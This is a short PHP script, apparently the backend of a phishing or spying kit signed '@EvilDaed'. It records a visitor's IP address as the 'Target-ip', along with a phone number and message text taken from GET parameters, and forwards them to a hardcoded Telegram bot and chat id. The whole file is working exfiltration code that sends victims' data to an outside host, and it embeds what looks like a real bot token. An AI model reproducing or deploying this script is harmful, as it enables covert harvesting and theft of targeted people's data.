<?php

$token="5456339479:AAErMB9WI-OH8A09eB6nWirZhSGoipHtvG4";
$id = -1001635980480;

$ip = $_SERVER['REMOTE_ADDR'];
$target = $_GET['phone'];
$message = $_GET['info'];

$text = "

�̳�̳ ̳N̳e̳w̳ ̳M̳e̳s̳s̳a̳g̳e̳ ̳�̳�̳
̳
̳�̳�̳ ̳T̳a̳r̳g̳e̳t̳-̳i̳p̳ ̳:̳   $ip
̳☎̳️̳ ̳P̳o̳h̳o̳n̳e̳N̳u̳m̳b̳e̳r̳ ̳:̳  $target
̳�̳�̳T̳e̳x̳t̳M̳e̳s̳s̳a̳g̳e̳ ̳:̳ ̳ 
̳$message

̳C̳o̳d̳e̳d̳ ̳:̳ ̳@̳E̳v̳i̳l̳D̳a̳e̳d̳

";

file_get_contents("https://api.telegram.org/bot$token/sendMessage?parse_mode=HTML&chat_id=$id&text=".urlencode($text));


?>